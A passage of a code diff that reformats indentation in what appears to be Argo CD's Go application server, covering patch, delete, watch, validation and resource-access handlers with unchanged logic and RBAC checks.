case \"merge\":\n+                patchApp, err = jsonpatch.MergePatch(jsonApp, []byte(q.GetPatch()))\n+                if err != nil {\n+                        return nil, fmt.Errorf(\"error calculating merge patch: %w\", err)\n+                }\n+        default:\n+                return nil, status.Error(codes.InvalidArgument, fmt.Sprintf(\"Patch type '%s' is not supported\", q.GetPatchType()))\n+        }\n+\n+        newApp := &appv1.Application{}\n+        err = json.Unmarshal(patchApp, newApp)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error unmarshaling patched app: %w\", err)\n+        }\n+        return s.validateAndUpdateApp(ctx, newApp, false, true, rbacpolicy.ActionUpdate, q.GetProject())\n }\n \n // Delete removes an application and all associated resources\n func (s *Server) Delete(ctx context.Context, q *application.ApplicationDeleteRequest) (*application.ApplicationResponse, error) {\n-\tappName := q.GetName()\n-\tappNs := s.appNamespaceOrDefault(q.GetAppNamespace())\n-\ta, err := s.getApplicationEnforceRBACClient(ctx, rbacpolicy.ActionGet, q.GetProject(), appNs, appName, \"\")\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\ts.projectLock.RLock(a.Spec.Project)\n-\tdefer s.projectLock.RUnlock(a.Spec.Project)\n-\n-\tif err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceApplications, rbacpolicy.ActionDelete, a.RBACName(s.ns)); err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tif q.Cascade != nil && !*q.Cascade && q.GetPropagationPolicy() != \"\" {\n-\t\treturn nil, status.Error(codes.InvalidArgument, \"cannot set propagation policy when cascading is disabled\")\n-\t}\n-\n-\tpatchFinalizer := false\n-\tif q.Cascade == nil || *q.Cascade {\n-\t\t// validate the propgation policy\n-\t\tpolicyFinalizer := getPropagationPolicyFinalizer(q.GetPropagationPolicy())\n-\t\tif policyFinalizer == \"\" {\n-\t\t\treturn nil, status.Errorf(codes.InvalidArgument, \"invalid propagation policy: %s\", *q.PropagationPolicy)\n-\t\t}\n-\t\tif !a.IsFinalizerPresent(policyFinalizer) {\n-\t\t\ta.SetCascadedDeletion(policyFinalizer)\n-\t\t\tpatchFinalizer = true\n-\t\t}\n-\t} else {\n-\t\tif a.CascadedDeletion() {\n-\t\t\ta.UnSetCascadedDeletion()\n-\t\t\tpatchFinalizer = true\n-\t\t}\n-\t}\n-\n-\tif patchFinalizer {\n-\t\t// Although the cascaded deletion/propagation policy finalizer is not set when apps are created via\n-\t\t// API, they will often be set by the user as part of declarative config. As part of a delete\n-\t\t// request, we always calculate the patch to see if we need to set/unset the finalizer.\n-\t\tpatch, err := json.Marshal(map[string]interface{}{\n-\t\t\t\"metadata\": map[string]interface{}{\n-\t\t\t\t\"finalizers\": a.Finalizers,\n-\t\t\t},\n-\t\t})\n-\t\tif err != nil {\n-\t\t\treturn nil, fmt.Errorf(\"error marshaling finalizers: %w\", err)\n-\t\t}\n-\t\t_, err = s.appclientset.ArgoprojV1alpha1().Applications(a.Namespace).Patch(ctx, a.Name, types.MergePatchType, patch, metav1.PatchOptions{})\n-\t\tif err != nil {\n-\t\t\treturn nil, fmt.Errorf(\"error patching application with finalizers: %w\", err)\n-\t\t}\n-\t}\n-\n-\terr = s.appclientset.ArgoprojV1alpha1().Applications(appNs).Delete(ctx, appName, metav1.DeleteOptions{})\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error deleting application: %w\", err)\n-\t}\n-\ts.logAppEvent(a, ctx, argo.EventReasonResourceDeleted, \"deleted application\")\n-\treturn &application.ApplicationResponse{}, nil\n+        appName := q.GetName()\n+        appNs := s.appNamespaceOrDefault(q.GetAppNamespace())\n+        a, err := s.getApplicationEnforceRBACClient(ctx, rbacpolicy.ActionGet, q.GetProject(), appNs, appName, \"\")\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        s.projectLock.RLock(a.Spec.Project)\n+        defer s.projectLock.RUnlock(a.Spec.Project)\n+\n+        if err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceApplications, rbacpolicy.ActionDelete, a.RBACName(s.ns)); err != nil {\n+                return nil, err\n+        }\n+\n+        if q.Cascade != nil && !*q.Cascade && q.GetPropagationPolicy() != \"\" {\n+                return nil, status.Error(codes.InvalidArgument, \"cannot set propagation policy when cascading is disabled\")\n+        }\n+\n+        patchFinalizer := false\n+        if q.Cascade == nil || *q.Cascade {\n+                // validate the propgation policy\n+                policyFinalizer := getPropagationPolicyFinalizer(q.GetPropagationPolicy())\n+                if policyFinalizer == \"\" {\n+                        return nil, status.Errorf(codes.InvalidArgument, \"invalid propagation policy: %s\", *q.PropagationPolicy)\n+                }\n+                if !a.IsFinalizerPresent(policyFinalizer) {\n+                        a.SetCascadedDeletion(policyFinalizer)\n+                        patchFinalizer = true\n+                }\n+        } else {\n+                if a.CascadedDeletion() {\n+                        a.UnSetCascadedDeletion()\n+                        patchFinalizer = true\n+                }\n+        }\n+\n+        if patchFinalizer {\n+                // Although the cascaded deletion/propagation policy finalizer is not set when apps are created via\n+                // API, they will often be set by the user as part of declarative config. As part of a delete\n+                // request, we always calculate the patch to see if we need to set/unset the finalizer.\n+                patch, err := json.Marshal(map[string]interface{}{\n+                        \"metadata\": map[string]interface{}{\n+                                \"finalizers\": a.Finalizers,\n+                        },\n+                })\n+                if err != nil {\n+                        return nil, fmt.Errorf(\"error marshaling finalizers: %w\", err)\n+                }\n+                _, err = s.appclientset.ArgoprojV1alpha1().Applications(a.Namespace).Patch(ctx, a.Name, types.MergePatchType, patch, metav1.PatchOptions{})\n+                if err != nil {\n+                        return nil, fmt.Errorf(\"error patching application with finalizers: %w\", err)\n+                }\n+        }\n+\n+        err = s.appclientset.ArgoprojV1alpha1().Applications(appNs).Delete(ctx, appName, metav1.DeleteOptions{})\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error deleting application: %w\", err)\n+        }\n+        s.logAppEvent(a, ctx, argo.EventReasonResourceDeleted, \"deleted application\")\n+        return &application.ApplicationResponse{}, nil\n }\n \n func (s *Server) isApplicationPermitted(selector labels.Selector, minVersion int, claims any, appName, appNs string, projects map[string]bool, a appv1.Application) bool {\n-\tif len(projects) > 0 && !projects[a.Spec.GetProject()] {\n-\t\treturn false\n-\t}\n-\n-\tif appVersion, err := strconv.Atoi(a.ResourceVersion); err == nil && appVersion < minVersion {\n-\t\treturn false\n-\t}\n-\tmatchedEvent := (appName == \"\" || (a.Name == appName && a.Namespace == appNs)) && selector.Matches(labels.Set(a.Labels))\n-\tif !matchedEvent {\n-\t\treturn false\n-\t}\n-\n-\tif !s.isNamespaceEnabled(a.Namespace) {\n-\t\treturn false\n-\t}\n-\n-\tif !s.enf.Enforce(claims, rbacpolicy.ResourceApplications, rbacpolicy.ActionGet, a.RBACName(s.ns)) {\n-\t\t// do not emit apps user does not have accessing\n-\t\treturn false\n-\t}\n-\n-\treturn true\n+        if len(projects) > 0 && !projects[a.Spec.GetProject()] {\n+                return false\n+        }\n+\n+        if appVersion, err := strconv.Atoi(a.ResourceVersion); err == nil && appVersion < minVersion {\n+                return false\n+        }\n+        matchedEvent := (appName == \"\" || (a.Name == appName && a.Namespace == appNs)) && selector.Matches(labels.Set(a.Labels))\n+        if !matchedEvent {\n+                return false\n+        }\n+\n+        if !s.isNamespaceEnabled(a.Namespace) {\n+                return false\n+        }\n+\n+        if !s.enf.Enforce(claims, rbacpolicy.ResourceApplications, rbacpolicy.ActionGet, a.RBACName(s.ns)) {\n+                // do not emit apps user does not have accessing\n+                return false\n+        }\n+\n+        return true\n }\n \n func (s *Server) Watch(q *application.ApplicationQuery, ws application.ApplicationService_WatchServer) error {\n-\tappName := q.GetName()\n-\tappNs := s.appNamespaceOrDefault(q.GetAppNamespace())\n-\tlogCtx := log.NewEntry(log.New())\n-\tif q.Name != nil {\n-\t\tlogCtx = logCtx.WithField(\"application\", *q.Name)\n-\t}\n-\tprojects := map[string]bool{}\n-\tfor _, project := range getProjectsFromApplicationQuery(*q) {\n-\t\tprojects[project] = true\n-\t}\n-\tclaims := ws.Context().Value(\"claims\")\n-\tselector, err := labels.Parse(q.GetSelector())\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"error parsing labels with selectors: %w\", err)\n-\t}\n-\tminVersion := 0\n-\tif q.GetResourceVersion() != \"\" {\n-\t\tif minVersion, err = strconv.Atoi(q.GetResourceVersion()); err != nil {\n-\t\t\tminVersion = 0\n-\t\t}\n-\t}\n-\n-\t// sendIfPermitted is a helper to send the application to the client's streaming channel if the\n-\t// caller has RBAC privileges permissions to view it\n-\tsendIfPermitted := func(a appv1.Application, eventType watch.EventType) {\n-\t\tpermitted := s.isApplicationPermitted(selector, minVersion, claims, appName, appNs, projects, a)\n-\t\tif !permitted {\n-\t\t\treturn\n-\t\t}\n-\t\ts.inferResourcesStatusHealth(&a)\n-\t\terr := ws.Send(&appv1.ApplicationWatchEvent{\n-\t\t\tType:        eventType,\n-\t\t\tApplication: a,\n-\t\t})\n-\t\tif err != nil {\n-\t\t\tlogCtx.Warnf(\"Unable to send stream message: %v\", err)\n-\t\t\treturn\n-\t\t}\n-\t}\n-\n-\tevents := make(chan *appv1.ApplicationWatchEvent, watchAPIBufferSize)\n-\t// Mimic watch API behavior: send ADDED events if no resource version provided\n-\t// If watch API is executed for one application when emit event even if resource version is provided\n-\t// This is required since single app watch API is used for during operations like app syncing and it is\n-\t// critical to never miss events.\n-\tif q.GetResourceVersion() == \"\" || q.GetName() != \"\" {\n-\t\tapps, err := s.appLister.List(selector)\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"error listing apps with selector: %w\", err)\n-\t\t}\n-\t\tsort.Slice(apps, func(i, j int) bool {\n-\t\t\treturn apps[i].QualifiedName() < apps[j].QualifiedName()\n-\t\t})\n-\t\tfor i := range apps {\n-\t\t\tsendIfPermitted(*apps[i], watch.Added)\n-\t\t}\n-\t}\n-\tunsubscribe := s.appBroadcaster.Subscribe(events)\n-\tdefer unsubscribe()\n-\tfor {\n-\t\tselect {\n-\t\tcase event := <-events:\n-\t\t\tsendIfPermitted(event.Application, event.Type)\n-\t\tcase <-ws.Context().Done():\n-\t\t\treturn nil\n-\t\t}\n-\t}\n+        appName := q.GetName()\n+        appNs := s.appNamespaceOrDefault(q.GetAppNamespace())\n+        logCtx := log.NewEntry(log.New())\n+        if q.Name != nil {\n+                logCtx = logCtx.WithField(\"application\", *q.Name)\n+        }\n+        projects := map[string]bool{}\n+        for _, project := range getProjectsFromApplicationQuery(*q) {\n+                projects[project] = true\n+        }\n+        claims := ws.Context().Value(\"claims\")\n+        selector, err := labels.Parse(q.GetSelector())\n+        if err != nil {\n+                return fmt.Errorf(\"error parsing labels with selectors: %w\", err)\n+        }\n+        minVersion := 0\n+        if q.GetResourceVersion() != \"\" {\n+                if minVersion, err = strconv.Atoi(q.GetResourceVersion()); err != nil {\n+                        minVersion = 0\n+                }\n+        }\n+\n+        // sendIfPermitted is a helper to send the application to the client's streaming channel if the\n+        // caller has RBAC privileges permissions to view it\n+        sendIfPermitted := func(a appv1.Application, eventType watch.EventType) {\n+                permitted := s.isApplicationPermitted(selector, minVersion, claims, appName, appNs, projects, a)\n+                if !permitted {\n+                        return\n+                }\n+                s.inferResourcesStatusHealth(&a)\n+                err := ws.Send(&appv1.ApplicationWatchEvent{\n+                        Type:        eventType,\n+                        Application: a,\n+                })\n+                if err != nil {\n+                        logCtx.Warnf(\"Unable to send stream message: %v\", err)\n+                        return\n+                }\n+        }\n+\n+        events := make(chan *appv1.ApplicationWatchEvent, watchAPIBufferSize)\n+        // Mimic watch API behavior: send ADDED events if no resource version provided\n+        // If watch API is executed for one application when emit event even if resource version is provided\n+        // This is required since single app watch API is used for during operations like app syncing and it is\n+        // critical to never miss events.\n+        if q.GetResourceVersion() == \"\" || q.GetName() != \"\" {\n+                apps, err := s.appLister.List(selector)\n+                if err != nil {\n+                        return fmt.Errorf(\"error listing apps with selector: %w\", err)\n+                }\n+                sort.Slice(apps, func(i, j int) bool {\n+                        return apps[i].QualifiedName() < apps[j].QualifiedName()\n+                })\n+                for i := range apps {\n+                        sendIfPermitted(*apps[i], watch.Added)\n+                }\n+        }\n+        unsubscribe := s.appBroadcaster.Subscribe(events)\n+        defer unsubscribe()\n+        for {\n+                select {\n+                case event := <-events:\n+                        sendIfPermitted(event.Application, event.Type)\n+                case <-ws.Context().Done():\n+                        return nil\n+                }\n+        }\n }\n \n func (s *Server) validateAndNormalizeApp(ctx context.Context, app *appv1.Application, validate bool) error {\n-\tproj, err := argo.GetAppProject(app, applisters.NewAppProjectLister(s.projInformer.GetIndexer()), s.ns, s.settingsMgr, s.db, ctx)\n-\tif err != nil {\n-\t\tif apierr.IsNotFound(err) {\n-\t\t\t// Offer no hint that the project does not exist.\n-\t\t\tlog.Warnf(\"User attempted to create/update application in non-existent project %q\", app.Spec.Project)\n-\t\t\treturn permissionDeniedErr\n-\t\t}\n-\t\treturn fmt.Errorf(\"error getting application's project: %w\", err)\n-\t}\n-\tif app.GetName() == \"\" {\n-\t\treturn fmt.Errorf(\"resource name may not be empty\")\n-\t}\n-\tappNs := s.appNamespaceOrDefault(app.Namespace)\n-\tcurrApp, err := s.appclientset.ArgoprojV1alpha1().Applications(appNs).Get(ctx, app.Name, metav1.GetOptions{})\n-\tif err != nil {\n-\t\tif !apierr.IsNotFound(err) {\n-\t\t\treturn fmt.Errorf(\"error getting application by name: %w\", err)\n-\t\t}\n-\t\t// Kubernetes go-client will return a pointer to a zero-value app instead of nil, even\n-\t\t// though the API response was NotFound. This behavior was confirmed via logs.\n-\t\tcurrApp = nil\n-\t}\n-\tif currApp != nil && currApp.Spec.GetProject() != app.Spec.GetProject() {\n-\t\t// When changing projects, caller must have application create & update privileges in new project\n-\t\t// NOTE: the update check was already verified in the caller to this function\n-\t\tif err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceApplications, rbacpolicy.ActionCreate, app.RBACName(s.ns)); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t\t// They also need 'update' privileges in the old project\n-\t\tif err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceApplications, rbacpolicy.ActionUpdate, currApp.RBACName(s.ns)); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t}\n-\n-\tif err := argo.ValidateDestination(ctx, &app.Spec.Destination, s.db); err != nil {\n-\t\treturn status.Errorf(codes.InvalidArgument, \"application destination spec for %s is invalid: %s\", app.Name, err.Error())\n-\t}\n-\n-\tvar conditions []appv1.ApplicationCondition\n-\n-\tif validate {\n-\t\tconditions := make([]appv1.ApplicationCondition, 0)\n-\t\tcondition, err := argo.ValidateRepo(ctx, app, s.repoClientset, s.db, s.kubectl, proj, s.settingsMgr)\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"error validating the repo: %w\", err)\n-\t\t}\n-\t\tconditions = append(conditions, condition...)\n-\t\tif len(conditions) > 0 {\n-\t\t\treturn status.Errorf(codes.InvalidArgument, \"application spec for %s is invalid: %s\", app.Name, argo.FormatAppConditions(conditions))\n-\t\t}\n-\t}\n-\n-\tconditions, err = argo.ValidatePermissions(ctx, &app.Spec, proj, s.db)\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"error validating project permissions: %w\", err)\n-\t}\n-\tif len(conditions) > 0 {\n-\t\treturn status.Errorf(codes.InvalidArgument, \"application spec for %s is invalid: %s\", app.Name, argo.FormatAppConditions(conditions))\n-\t}\n-\n-\tapp.Spec = *argo.NormalizeApplicationSpec(&app.Spec)\n-\treturn nil\n+        proj, err := argo.GetAppProject(app, applisters.NewAppProjectLister(s.projInformer.GetIndexer()), s.ns, s.settingsMgr, s.db, ctx)\n+        if err != nil {\n+                if apierr.IsNotFound(err) {\n+                        // Offer no hint that the project does not exist.\n+                        log.Warnf(\"User attempted to create/update application in non-existent project %q\", app.Spec.Project)\n+                        return permissionDeniedErr\n+                }\n+                return fmt.Errorf(\"error getting application's project: %w\", err)\n+        }\n+        if app.GetName() == \"\" {\n+                return fmt.Errorf(\"resource name may not be empty\")\n+        }\n+        appNs := s.appNamespaceOrDefault(app.Namespace)\n+        currApp, err := s.appclientset.ArgoprojV1alpha1().Applications(appNs).Get(ctx, app.Name, metav1.GetOptions{})\n+        if err != nil {\n+                if !apierr.IsNotFound(err) {\n+                        return fmt.Errorf(\"error getting application by name: %w\", err)\n+                }\n+                // Kubernetes go-client will return a pointer to a zero-value app instead of nil, even\n+                // though the API response was NotFound. This behavior was confirmed via logs.\n+                currApp = nil\n+        }\n+        if currApp != nil && currApp.Spec.GetProject() != app.Spec.GetProject() {\n+                // When changing projects, caller must have application create & update privileges in new project\n+                // NOTE: the update check was already verified in the caller to this function\n+                if err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceApplications, rbacpolicy.ActionCreate, app.RBACName(s.ns)); err != nil {\n+                        return err\n+                }\n+                // They also need 'update' privileges in the old project\n+                if err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceApplications, rbacpolicy.ActionUpdate, currApp.RBACName(s.ns)); err != nil {\n+                        return err\n+                }\n+        }\n+\n+        if err := argo.ValidateDestination(ctx, &app.Spec.Destination, s.db); err != nil {\n+                return status.Errorf(codes.InvalidArgument, \"application destination spec for %s is invalid: %s\", app.Name, err.Error())\n+        }\n+\n+        var conditions []appv1.ApplicationCondition\n+\n+        if validate {\n+                conditions := make([]appv1.ApplicationCondition, 0)\n+                condition, err := argo.ValidateRepo(ctx, app, s.repoClientset, s.db, s.kubectl, proj, s.settingsMgr)\n+                if err != nil {\n+                        return fmt.Errorf(\"error validating the repo: %w\", err)\n+                }\n+                conditions = append(conditions, condition...)\n+                if len(conditions) > 0 {\n+                        return status.Errorf(codes.InvalidArgument, \"application spec for %s is invalid: %s\", app.Name, argo.FormatAppConditions(conditions))\n+                }\n+        }\n+\n+        conditions, err = argo.ValidatePermissions(ctx, &app.Spec, proj, s.db)\n+        if err != nil {\n+                return fmt.Errorf(\"error validating project permissions: %w\", err)\n+        }\n+        if len(conditions) > 0 {\n+                return status.Errorf(codes.InvalidArgument, \"application spec for %s is invalid: %s\", app.Name, argo.FormatAppConditions(conditions))\n+        }\n+\n+        app.Spec = *argo.NormalizeApplicationSpec(&app.Spec)\n+        return nil\n }\n \n func (s *Server) getApplicationClusterConfig(ctx context.Context, a *appv1.Application) (*rest.Config, error) {\n-\tif err := argo.ValidateDestination(ctx, &a.Spec.Destination, s.db); err != nil {\n-\t\treturn nil, fmt.Errorf(\"error validating destination: %w\", err)\n-\t}\n-\tclst, err := s.db.GetCluster(ctx, a.Spec.Destination.Server)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error getting cluster: %w\", err)\n-\t}\n-\tconfig := clst.RESTConfig()\n-\treturn config, err\n+        if err := argo.ValidateDestination(ctx, &a.Spec.Destination, s.db); err != nil {\n+                return nil, fmt.Errorf(\"error validating destination: %w\", err)\n+        }\n+        clst, err := s.db.GetCluster(ctx, a.Spec.Destination.Server)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error getting cluster: %w\", err)\n+        }\n+        config := clst.RESTConfig()\n+        return config, err\n }\n \n // getCachedAppState loads the cached state and trigger app refresh if cache is missing\n func (s *Server) getCachedAppState(ctx context.Context, a *appv1.Application, getFromCache func() error) error {\n-\terr := getFromCache()\n-\tif err != nil && err == servercache.ErrCacheMiss {\n-\t\tconditions := a.Status.GetConditions(map[appv1.ApplicationConditionType]bool{\n-\t\t\tappv1.ApplicationConditionComparisonError:  true,\n-\t\t\tappv1.ApplicationConditionInvalidSpecError: true,\n-\t\t})\n-\t\tif len(conditions) > 0 {\n-\t\t\treturn errors.New(argoutil.FormatAppConditions(conditions))\n-\t\t}\n-\t\t_, err = s.Get(ctx, &application.ApplicationQuery{\n-\t\t\tName:         pointer.String(a.GetName()),\n-\t\t\tAppNamespace: pointer.String(a.GetNamespace()),\n-\t\t\tRefresh:      pointer.String(string(appv1.RefreshTypeNormal)),\n-\t\t})\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"error getting application by query: %w\", err)\n-\t\t}\n-\t\treturn getFromCache()\n-\t}\n-\treturn err\n+        err := getFromCache()\n+        if err != nil && err == servercache.ErrCacheMiss {\n+                conditions := a.Status.GetConditions(map[appv1.ApplicationConditionType]bool{\n+                        appv1.ApplicationConditionComparisonError:  true,\n+                        appv1.ApplicationConditionInvalidSpecError: true,\n+                })\n+                if len(conditions) > 0 {\n+                        return errors.New(argoutil.FormatAppConditions(conditions))\n+                }\n+                _, err = s.Get(ctx, &application.ApplicationQuery{\n+                        Name:         pointer.String(a.GetName()),\n+                        AppNamespace: pointer.String(a.GetNamespace()),\n+                        Refresh:      pointer.String(string(appv1.RefreshTypeNormal)),\n+                })\n+                if err != nil {\n+                        return fmt.Errorf(\"error getting application by query: %w\", err)\n+                }\n+                return getFromCache()\n+        }\n+        return err\n }\n \n func (s *Server) getAppResources(ctx context.Context, a *appv1.Application) (*appv1.ApplicationTree, error) {\n-\tvar tree appv1.ApplicationTree\n-\terr := s.getCachedAppState(ctx, a, func() error {\n-\t\treturn s.cache.GetAppResourcesTree(a.InstanceName(s.ns), &tree)\n-\t})\n-\tif err != nil {\n-\t\treturn &tree, fmt.Errorf(\"error getting cached app resource tree: %w\", err)\n-\t}\n-\treturn &tree, nil\n+        var tree appv1.ApplicationTree\n+        err := s.getCachedAppState(ctx, a, func() error {\n+                return s.cache.GetAppResourcesTree(a.InstanceName(s.ns), &tree)\n+        })\n+        if err != nil {\n+                return &tree, fmt.Errorf(\"error getting cached app resource tree: %w\", err)\n+        }\n+        return &tree, nil\n }\n \n func (s *Server) getAppLiveResource(ctx context.Context, action string, q *application.ApplicationResourceRequest) (*appv1.ResourceNode, *rest.Config, *appv1.Application, error) {\n-\ta, err := s.getApplicationEnforceRBACInformer(ctx, action, q.GetProject(), q.GetAppNamespace(), q.GetName())\n-\tif err != nil {\n-\t\treturn nil, nil, nil, err\n-\t}\n-\ttree, err := s.getAppResources(ctx, a)\n-\tif err != nil {\n-\t\treturn nil, nil, nil, fmt.Errorf(\"error getting app resources: %w\", err)\n-\t}\n-\n-\tfound := tree.FindNode(q.GetGroup(), q.GetKind(), q.GetNamespace(), q.GetResourceName())\n-\tif found == nil || found.ResourceRef.UID == \"\" {\n-\t\treturn nil, nil, nil, status.Errorf(codes.InvalidArgument, \"%s %s %s not found as part of application %s\", q.GetKind(), q.GetGroup(), q.GetResourceName(), q.GetName())\n-\t}\n-\tconfig, err := s.getApplicationClusterConfig(ctx, a)\n-\tif err != nil {\n-\t\treturn nil, nil, nil, fmt.Errorf(\"error getting application cluster config: %w\", err)\n-\t}\n-\treturn found, config, a, nil\n+        a, err := s.getApplicationEnforceRBACInformer(ctx, action, q.GetProject(), q.GetAppNamespace(), q.GetName())\n+        if err != nil {\n+                return nil, nil, nil, err\n+        }\n+        tree, err := s.getAppResources(ctx, a)\n+        if err != nil {\n+                return nil, nil, nil, fmt.Errorf(\"error getting app resources: %w\", err)\n+        }\n+\n+        found := tree.FindNode(q.GetGroup(), q.GetKind(), q.GetNamespace(), q.GetResourceName())\n+        if found == nil || found.ResourceRef.UID == \"\" {\n+                return nil, nil, nil, status.Errorf(codes.InvalidArgument, \"%s %s %s not found as part of application %s\", q.GetKind(), q.GetGroup(), q.GetResourceName(), q.GetName())\n+        }\n+        config, err := s.getApplicationClusterConfig(ctx, a)\n+        if err != nil {\n+                return nil, nil, nil, fmt.Errorf(\"error getting application cluster config: %w\", err)\n+        }\n+        return found, config, a, nil\n }\n \n func (s *Server) GetResource(ctx context.Context, q *application.ApplicationResourceRequest) (*application.ApplicationResourceResponse, error) {\n-\tres, config, _, err := s.getAppLiveResource(ctx, rbacpolicy.ActionGet, q)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\t// make sure to use specified resource version if provided\n-\tif q.GetVersion() != \"\" {\n-\t\tres.Version = q.GetVersion()\n-\t}\n-\tobj, err := s.kubectl.GetResource(ctx, config, res.GroupKindVersion(), res.Name, res.Namespace)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error getting resource: %w\", err)\n-\t}\n-\tobj, err = replaceSecretValues(obj)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error replacing secret values: %w\", err)\n-\t}\n-\tdata, err := json.Marshal(obj.Object)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error marshaling object: %w\", err)\n-\t}\n-\tmanifest := string(data)\n-\treturn &application.ApplicationResourceResponse{Manifest: &manifest}, nil\n+        res, config, _, err := s.getAppLiveResource(ctx, rbacpolicy.ActionGet, q)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        // make sure to use specified resource version if provided\n+        if q.GetVersion() != \"\" {\n+                res.Version = q.GetVersion()\n+        }\n+        obj, err := s.kubectl.GetResource(ctx, config, res.GroupKindVersion(), res.Name, res.Namespace)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error getting resource: %w\", err)\n+        }\n+        obj, err = replaceSecretValues(obj)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error replacing secret values: %w\", err)\n+        }\n+        data, err := json.Marshal(obj.Object)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error marshaling object: %w\", err)\n+        }\n+        manifest := string(data)\n+        return &application.ApplicationResourceResponse{Manifest: &manifest}, nil\n }\n \n func replaceSecretValues(obj *unstructured.Unstructured) (*unstructured.Unstructured, error) {\n-\tif obj.GetKind() == kube.SecretKind && obj.GroupVersionKind().Group == \"\" {\n-\t\t_, obj, err := diff.HideSecretData(nil, obj)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t\treturn obj, err\n-\t}\n-\treturn obj, nil\n+        if obj.GetKind() == kube.SecretKind && obj.GroupVersionKind().Group == \"\" {\n+                _, obj, err := diff.HideSecretData(nil, obj)\n+                if err != nil {\n+                        return nil, err\n+                }\n+                return obj, err\n+        }\n+        return obj, nil\n }\n \n // PatchResource patches a resource\n func (s *Server) PatchResource(ctx context.Context, q *application.ApplicationResourcePatchRequest) (*application.ApplicationResourceResponse, error) {\n-\tresourceRequest := &application.ApplicationResourceRequest{\n-\t\tName:         q.Name,\n-\t\tAppNamespace: q.AppNamespace,\n-\t\tNamespace:    q.Namespace,\n-\t\tResourceName: q.ResourceName,\n-\t\tKind:         q.Kind,\n-\t\tVersion:      q.Version,\n-\t\tGroup:        q.Group,\n-\t\tProject:      q.Project,\n-\t}\n-\tres, config, a, err := s.getAppLiveResource(ctx, rbacpolicy.ActionUpdate, resourceRequest)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tmanifest, err := s.kubectl.PatchResource(ctx, config, res.GroupKindVersion(), res.Name, res.Namespace, types.PatchType(q.GetPatchType()), []byte(q.GetPatch()))\n-\tif err != nil {\n-\t\t// don't expose real error for secrets since it might contain secret data\n-\t\tif res.Kind == kube.SecretKind && res.Group == \"\" {\n-\t\t\treturn nil, fmt.Errorf(\"failed to patch Secret %s/%s\", res.Namespace, res.Name)\n-\t\t}\n-\t\treturn nil, fmt.Errorf(\"error patching resource: %w\", err)\n-\t}\n-\tif manifest == nil {\n-\t\treturn nil, fmt.Errorf(\"failed to patch resource: manifest was nil\")\n-\t}\n-\tmanifest, err = replaceSecretValues(manifest)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error replacing secret values: %w\", err)\n-\t}\n-\tdata, err := json.Marshal(manifest.Object)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"erro marshaling manifest object: %w\", err)\n-\t}\n-\ts.logAppEvent(a, ctx, argo.EventReasonResourceUpdated, fmt.Sprintf(\"patched resource %s/%s '%s'\", q.GetGroup(), q.GetKind(), q.GetResourceName()))\n-\tm := string(data)\n-\treturn &application.ApplicationResourceResponse{\n-\t\tManifest: &m,\n-\t}, nil\n+        resourceRequest := &application.ApplicationResourceRequest{\n+                Name:         q.Name,\n+                AppNamespace: q.AppNamespace,\n+                Namespace:    q.Namespace,\n+                ResourceName: q.ResourceName,\n+                Kind:         q.Kind,\n+                Version:      q.Version,\n+                Group:        q.Group,\n+                Project:      q.Project,\n+        }\n+        res, config, a, err := s.getAppLiveResource(ctx, rbacpolicy.ActionUpdate, resourceRequest)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        manifest, err := s.kubectl.PatchResource(ctx, config, res.GroupKindVersion(), res.Name, res.Namespace, types.PatchType(q.GetPatchType()), []byte(q.GetPatch()))\n+        if err != nil {\n+                // don't expose real error for secrets since it might contain secret data\n+                if res.Kind == kube.SecretKind && res.Group == \"\" {\n+                        return nil, fmt.Errorf(\"failed to patch Secret %s/%s\", res.Namespace, res.Name)\n+                }\n+                return nil, fmt.Errorf(\"error patching resource: %w\", err)\n+        }\n+        if manifest == nil {\n+                return nil, fmt.Errorf(\"failed to patch resource: manifest was nil\")\n+        }\n+        manifest, err = replaceSecretValues(manifest)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error replacing secret values: %w\", err)\n+        }\n+        data, err := json.Marshal(manifest.Object)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"erro marshaling manifest object: %w\", err)\n+        }\n+        s.logAppEvent(a, ctx, argo.EventReasonResourceUpdated, fmt.Sprintf(\"patched resource %s/%s '%s'\", q.GetGroup(), q.GetKind(), q.GetResourceName()))\n+        m := string(data)\n+        return &application.ApplicationResourceResponse{\n+                Manifest: &m,\n+        }, nil\n }\n \n // DeleteResource deletes a specified resource\n func (s *Server) DeleteResource(ctx context.Context, q *application.ApplicationResourceDeleteRequest) (*application.ApplicationResponse, error) {\n-\tresourceRequest := &application.ApplicationResourceRequest{\n-\t\tName:         